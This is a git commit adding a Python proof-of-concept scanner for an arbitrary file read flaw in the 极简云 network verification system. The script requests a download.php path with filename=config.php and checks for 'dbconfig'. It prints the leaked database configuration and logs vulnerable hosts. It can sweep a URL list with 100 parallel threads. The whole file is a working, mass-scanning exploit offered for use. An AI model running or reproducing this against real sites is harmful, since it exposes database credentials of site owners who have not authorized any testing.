1c382313a85e81345cd84d6d2680142cb9e661ec
PanDa <168183576+Doing-meaningful-things@users.noreply.github.com>
2024-09-18 08:49:03 +0800

    Add files via upload

---
+++ 极简云-网络验证系统-任意文件读取/极简云-网络验证系统-任意文件读取.py
@@ -0,0 +1,62 @@
+import sys,argparse,requests,re
+requests.packages.urllib3.disable_warnings()
+from multiprocessing.dummy import Pool
+
+
+def banner():
+    banner = """
+
+██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
+██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
+██████╔╝███████║██╔██╗ ██║██║  ██║███████║
+██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
+██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
+                      author:panda
+                      type: 极简云-网络验证系统-任意文件读取
+                      date:2024-09-2
+                      version:1.0
+   """
+    print(banner)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="极简云-网络验证系统-任意文件读取")
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace('\n',''))
+            mp = Pool(100)
+            mp.map(poc,url_list)
+            mp.close()
+            mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+def poc(target):
+    payload = "/download.php?file=20b6cb088a8d5c444074&filename=config.php"
+    try:
+        res1 = requests.get(url=target,verify=False,timeout=5)
+        if res1.status_code == 200:
+            res2 = requests.get(url=target+payload,verify=False,timeout=5)
+            if "dbconfig" in res2.text:
+                with open("result.txt","a",encoding="utf-8") as f:
+                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
+                print(f"该网站[+]{target}存在任意文件读取漏洞")
+                print(res2.text)
+            else:
+                print(f"该网站[+]{target}不存在任意文件读取漏洞")
+        else:
+            print(f"该网站[+]{target}有问题，请手动测试！！")
+    except Exception as e:
+        print(e)
+
+
+
+if __name__ == '__main__':
+    main()
